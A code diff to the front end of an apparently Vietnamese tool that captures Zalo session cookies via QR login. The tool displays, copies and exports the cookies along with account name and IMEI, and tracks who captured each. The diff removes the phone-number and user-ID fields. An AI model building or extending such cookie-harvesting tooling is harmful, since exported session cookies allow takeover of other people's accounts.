@@ -518,7 +518,7 @@ body{background:var(--bg1);color:var(--text);font-family:-apple-system,BlinkMacS
         <div class="avatar-circle">👤</div>
         <div>
           <div class="acc-name" id="res-name">—</div>
-          <div class="acc-sub" id="res-phone">📱 —</div>
+          
           <div class="acc-sub" id="res-time" style="margin-top:2px;font-size:11px">🕐 —</div>
         </div>
       </div>
@@ -530,7 +530,7 @@ body{background:var(--bg1);color:var(--text);font-family:-apple-system,BlinkMacS
         <div class="tabs">
           <div class="tab active" onclick="switchTab('str')">🍪 Cookie String</div>
           <div class="tab" onclick="switchTab('json')">{ } JSON</div>
-          <div class="tab" onclick="switchTab('info')">🆔 Info</div>
+          
         </div>
         <div class="tab-panel active" id="tab-str">
           <div class="info-row"><div class="info-label">Cookie String</div><div class="info-value" id="res-cookie-str">—</div></div>
@@ -538,8 +538,6 @@ body{background:var(--bg1);color:var(--text);font-family:-apple-system,BlinkMacS
         <div class="tab-panel" id="tab-json">
           <div class="info-row"><div class="info-label">Cookie JSON</div><div class="info-value" id="res-cookie-json">—</div></div>
         </div>
-        <div class="tab-panel" id="tab-info">
-          <div class="info-row"><div class="info-label">User ID</div><div class="info-value" id="res-uid">—</div></div>
         </div>
       </div>
       <div class="btn-row">
@@ -965,10 +963,8 @@ function showResult(data){
   document.getElementById('qr-area').style.display='none';
   document.getElementById('btn-start-row').style.display='none';
   document.getElementById('res-name').textContent=data.name||'N/A';
-  document.getElementById('res-phone').textContent='📱 '+(data.phone||'Không rõ');
   document.getElementById('res-time').textContent='🕐 '+(data.time||'');
   document.getElementById('res-imei').textContent=data.imei||'N/A';
-  document.getElementById('res-uid').textContent=data.user_id||'N/A';
   document.getElementById('res-cookie-str').textContent=data.cookie_str||'';
   document.getElementById('res-cookie-json').textContent=JSON.stringify(data.cookies||{},null,2);
   document.getElementById('result-wrap').style.display='flex';
@@ -1026,7 +1022,7 @@ function resetUI(){
 // ═══════════════════════════════════════════════════════
 function switchTab(name){
   document.querySelectorAll('.tabs .tab').forEach((t,i)=>t.classList.toggle('active',['str','json','info'][i]===name));
-  document.querySelectorAll('.tab-panel').forEach((p,i)=>p.classList.toggle('active',['tab-str','tab-json','tab-info'][i]==='tab-'+name));
+  document.querySelectorAll('.tab-panel').forEach((p,i)=>p.classList.toggle('active',['tab-str','tab-json'][i]==='tab-'+name));
 }
 function copyCookie(btn){
   if(!currentData)return;
@@ -1036,13 +1032,13 @@ function copyCookie(btn){
   });
 }
 function buildTxt(d){
-  return ['=== ZALO COOKIE ===','Tên: '+(d.name||'N/A'),'SĐT: '+(d.phone||'Không rõ'),'UserID: '+(d.user_id||'N/A'),'IMEI: '+(d.imei||'N/A'),'Thời gian: '+(d.time||''),d.owner?'Lấy bởi: '+d.owner:'','','--- COOKIE STRING ---',d.cookie_str||'','','--- COOKIE JSON ---',JSON.stringify(d.cookies||{},null,2)].join('\n');
+  return ['=== ZALO COOKIE ===','Tên: '+(d.name||'N/A'),'IMEI: '+(d.imei||'N/A'),'Thời gian: '+(d.time||''),d.owner?'Lấy bởi: '+d.owner:'','','--- COOKIE STRING ---',d.cookie_str||'','','--- COOKIE JSON ---',JSON.stringify(d.cookies||{},null,2)].join('\n');
 }
 function downloadTxt(){
   if(!currentData)return;
   const blob=new Blob([buildTxt(currentData)],{type:'text/plain'});
   const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
-  a.download='cookie_'+(currentData.phone||'zalo').replace(/\+/g,'')+'_'+Date.now()+'.txt'; a.click();
+  a.download='cookie_'+(currentData.name||'zalo').replace(/ /g,'_')+'_'+Date.now()+'.txt'; a.click();
 }
 
 // ═══════════════════════════════════════════════════════
@@ -1070,7 +1066,6 @@ function renderHistory(){
   list.innerHTML=chunk.map((r,i)=>`
     <div class="hist-item">
       <div class="hist-head"><span class="hist-name">👤 ${r.name||'N/A'}</span><span class="hist-time">🕐 ${r.time||''}</span></div>
-      <div class="hist-phone">📱 ${r.phone||'Không rõ'} · 🆔 ${r.user_id||'N/A'}</div>
       ${IS_ADMIN&&r.owner?`<div class="hist-phone" style="color:var(--yellow)">👤 Bởi: ${r.owner}</div>`:''}
       <div class="hist-actions">
         <div class="hist-btn" onclick="viewHistDetail(${histPage*HIST_PP+i})">🔍 Chi tiết</div>
@@ -1093,11 +1088,9 @@ function viewHistDetail(idx){
     <div class="acc-card" style="margin-bottom:12px">
       <div class="avatar-circle">👤</div>
       <div><div class="acc-name">${r.name||'N/A'}</div>
-      <div class="acc-sub">📱 ${r.phone||'Không rõ'}</div>
       <div class="acc-sub" style="font-size:11px">🕐 ${r.time||''}</div>
       ${IS_ADMIN&&r.owner?`<div class="acc-sub" style="color:var(--yellow)">👤 Bởi: ${r.owner}</div>`:''}</div>
     </div>
-    <div class="info-row" style="margin-bottom:10px"><div class="info-label">🆔 User ID</div><div class="info-value">${r.user_id||'N/A'}</div></div>
     <div class="info-row" style="margin-bottom:10px"><div class="info-label">📡 IMEI</div><div class="info-value">${r.imei||'N/A'}</div></div>
     <div class="info-row"><div class="info-label">🍪 Cookie String</div><div class="info-value">${r.cookie_str||'N/A'}</div></div>`;
   openModal('hist-detail-modal');
@@ -1106,7 +1099,7 @@ function downloadHistDetail(){
   if(!viewingHistItem)return;
   const blob=new Blob([buildTxt(viewingHistItem)],{type:'text/plain'});
   const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
-  a.download='cookie_'+(viewingHistItem.phone||'zalo').replace(/\+/g,'')+'_'+Date.now()+'.txt'; a.click();
+  a.download='cookie_'+(viewingHistItem.name||'zalo').replace(/ /g,'_')+'_'+Date.now()+'.txt'; a.click();
 }
 function copyHistDetailCookie(btn){
   if(!viewingHistItem)return;
@@ -1124,7 +1117,7 @@ function downloadHistTxt(idx){
   const r=histData[idx];
   const blob=new Blob([buildTxt(r)],{type:'text/plain'});
   const a=document.createElement('a'); a.href=URL.createObjectURL(blob);
-  a.download='cookie_'+(r.phone||'zalo').replace(/\+/g,'')+'_'+Date.now()+'.txt'; a.click();
+  a.download='cookie_'+(r.name||'zalo').replace(/ /g,'_')+'_'+Date.now()+'.txt'; a.click();
 }
 async function updateHistBadge(){
   try{
